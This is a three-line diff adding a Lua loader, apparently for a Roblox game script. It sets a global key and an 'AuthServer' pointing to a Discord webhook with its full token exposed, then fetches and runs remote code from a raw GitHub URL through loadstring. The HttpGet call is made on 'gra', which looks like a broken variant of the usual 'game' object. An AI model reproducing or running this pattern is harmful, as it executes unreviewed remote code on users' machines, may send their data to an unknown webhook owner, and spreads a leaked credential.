@@ -1,0 +1,3 @@
+_G.Key = "2715765469"
+_G.AuthServer = "https://discord.com/api/webhooks/1097502776524804197/G0qAuLSgaRwqsZnxfXItbp_q62_sZ3ohONxRtkwRhAw8yLlxegQANyEgBCjUQi8b8vfC"
+loadstring(gra:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
